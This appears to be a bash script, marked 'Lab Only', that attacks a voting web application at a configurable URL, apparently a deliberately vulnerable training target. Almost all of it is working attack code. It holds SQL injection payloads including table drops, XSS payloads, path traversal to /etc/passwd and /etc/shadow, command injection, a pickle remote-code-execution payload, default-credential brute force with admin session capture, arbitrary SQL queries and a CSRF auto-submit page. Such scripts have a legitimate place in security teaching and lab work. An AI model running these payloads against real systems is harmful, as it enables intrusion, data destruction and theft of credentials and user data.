#!/bin/bash

# Script to exploit vulnerabilities in the voting application
# Multiple attack vectors included

set -eo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

VOTING_URL="${1:-http://localhost:8080}"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         Voting Application Exploitation Script              ║"
echo "║                  (Lab Only)                                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

echo -e "${YELLOW}Target: $VOTING_URL${NC}\n"

# 1. SQL Injection in vote endpoint
echo -e "${BLUE}[1] SQL Injection - Vote Manipulation${NC}"
echo -e "${YELLOW}Attempting SQL injection in vote endpoint...${NC}"

# SQL Injection payloads
SQL_PAYLOADS=(
    "yes' OR '1'='1"
    "no' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
    "yes'; DROP TABLE votes;--"
    "yes' OR 1=1--"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    echo -e "${YELLOW}  Testing: $payload${NC}"
    curl -s -X POST "$VOTING_URL/vote" \
        -d "question_id=1&vote=$payload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        > /dev/null 2>&1 || true
done
echo -e "${GREEN}✓ SQL injection attempts completed${NC}\n"

# 2. SQL Injection in API endpoint
echo -e "${BLUE}[2] SQL Injection - API Endpoint${NC}"
echo -e "${YELLOW}Testing SQL injection via API...${NC}"

API_PAYLOADS=(
    "1 OR 1=1"
    "1 UNION SELECT * FROM users--"
    "1'; DROP TABLE votes;--"
)

for payload in "${API_PAYLOADS[@]}"; do
    echo -e "${YELLOW}  Testing: $payload${NC}"
    curl -s "$VOTING_URL/api/votes?question_id=$payload" | head -5
done
echo -e "${GREEN}✓ API SQL injection attempts completed${NC}\n"

# 3. XSS in comments
echo -e "${BLUE}[3] Cross-Site Scripting (XSS)${NC}"
echo -e "${YELLOW}Testing XSS in comment section...${NC}"

XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<iframe src=javascript:alert('XSS')>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo -e "${YELLOW}  Testing: ${payload:0:30}...${NC}"
    curl -s -X POST "$VOTING_URL/comment" \
        -d "comment=$payload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        > /dev/null 2>&1 || true
done
echo -e "${GREEN}✓ XSS attempts completed${NC}\n"

# 4. Path Traversal
echo -e "${BLUE}[4] Path Traversal${NC}"
echo -e "${YELLOW}Testing path traversal...${NC}"

PATH_PAYLOADS=(
    "../../../etc/passwd"
    "../../../etc/shadow"
    "../../../etc/hosts"
    "../../../proc/self/environ"
    "../../../app/app.py"
)

for payload in "${PATH_PAYLOADS[@]}"; do
    echo -e "${YELLOW}  Testing: $payload${NC}"
    curl -s "$VOTING_URL/file?file=$payload" | head -10
done
echo -e "${GREEN}✓ Path traversal attempts completed${NC}\n"

# 5. Command Injection
echo -e "${BLUE}[5] Command Injection${NC}"
echo -e "${YELLOW}Testing command injection...${NC}"

CMD_PAYLOADS=(
    "id"
    "whoami"
    "uname -a"
    "cat /etc/passwd"
    "ls -la /app"
    "env"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    echo -e "${YELLOW}  Testing: $payload${NC}"
    curl -s "$VOTING_URL/exec?cmd=$payload" | head -10
done
echo -e "${GREEN}✓ Command injection attempts completed${NC}\n"

# 6. Insecure Deserialization
echo -e "${BLUE}[6] Insecure Deserialization${NC}"
echo -e "${YELLOW}Testing pickle deserialization...${NC}"

# Create a simple pickle payload
python3 << 'PYTHON' > /tmp/pickle_payload.txt
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
PYTHON

PICKLE_PAYLOAD=$(cat /tmp/pickle_payload.txt)
echo -e "${YELLOW}  Testing pickle deserialization...${NC}"
curl -s "$VOTING_URL/deserialize?data=$PICKLE_PAYLOAD" | head -5
echo -e "${GREEN}✓ Deserialization attempts completed${NC}\n"

# 7. Admin Panel Brute Force
echo -e "${BLUE}[7] Weak Authentication${NC}"
echo -e "${YELLOW}Testing admin panel authentication...${NC}"

# Try default credentials
CREDS=(
    "admin:admin"
    "admin:admin123"
    "admin:password"
    "admin:123456"
)

for cred in "${CREDS[@]}"; do
    USERNAME="${cred%%:*}"
    PASSWORD="${cred##*:}"
    echo -e "${YELLOW}  Testing: $USERNAME:$PASSWORD${NC}"
    curl -s -X POST "$VOTING_URL/admin" \
        -d "username=$USERNAME&password=$PASSWORD" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -L | grep -q "Admin Panel" && echo -e "${GREEN}    ✓ Login successful!${NC}" || true
done
echo -e "${GREEN}✓ Authentication attempts completed${NC}\n"

# 8. Information Disclosure
echo -e "${BLUE}[8] Information Disclosure${NC}"
echo -e "${YELLOW}Testing debug endpoint...${NC}"
curl -s "$VOTING_URL/debug" | python3 -m json.tool | head -30
echo -e "${GREEN}✓ Information disclosure check completed${NC}\n"

# 9. Admin SQL Query Execution
echo -e "${BLUE}[9] Admin Panel SQL Injection${NC}"
echo -e "${YELLOW}Attempting SQL queries via admin panel...${NC}"

# First login
SESSION_COOKIE=$(curl -s -c - -X POST "$VOTING_URL/admin" \
    -d "username=admin&password=admin123" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -L | grep session | awk '{print $7}')

if [ -n "$SESSION_COOKIE" ]; then
    echo -e "${GREEN}  ✓ Admin session obtained${NC}"
    
    SQL_QUERIES=(
        "SELECT * FROM votes"
        "SELECT * FROM users"
        "SELECT * FROM information_schema.tables"
        "SHOW DATABASES"
    )
    
    for query in "${SQL_QUERIES[@]}"; do
        echo -e "${YELLOW}  Executing: $query${NC}"
        curl -s -X POST "$VOTING_URL/admin/query" \
            -d "query=$query" \
            -b "session=$SESSION_COOKIE" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            | python3 -m json.tool | head -20
    done
else
    echo -e "${YELLOW}  Could not obtain admin session${NC}"
fi
echo -e "${GREEN}✓ Admin SQL queries completed${NC}\n"

# 10. CSRF Attack Simulation
echo -e "${BLUE}[10] CSRF Attack Simulation${NC}"
echo -e "${YELLOW}Testing CSRF vulnerability...${NC}"

# Create CSRF payload
cat > /tmp/csrf.html << 'HTML'
<html>
<body>
<form id="csrf" action="VOTING_URL/vote" method="POST">
    <input type="hidden" name="question_id" value="1">
    <input type="hidden" name="vote" value="yes">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
HTML

echo -e "${YELLOW}  CSRF payload created at /tmp/csrf.html${NC}"
echo -e "${GREEN}✓ CSRF test completed${NC}\n"

echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║           Exploitation Attempts Completed                   ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}Vulnerabilities tested:${NC}"
echo -e "  ✓ SQL Injection (multiple vectors)"
echo -e "  ✓ Cross-Site Scripting (XSS)"
echo -e "  ✓ Path Traversal"
echo -e "  ✓ Command Injection"
echo -e "  ✓ Insecure Deserialization"
echo -e "  ✓ Weak Authentication"
echo -e "  ✓ Information Disclosure"
echo -e "  ✓ CSRF"
echo -e "  ✓ Arbitrary SQL Execution"

echo -e "\n${YELLOW}Next steps:${NC}"
echo -e "  - Review application logs for successful exploits"
echo -e "  - Check database for injected data"
echo -e "  - Verify file system access"
echo -e "  - Test authenticated endpoints"

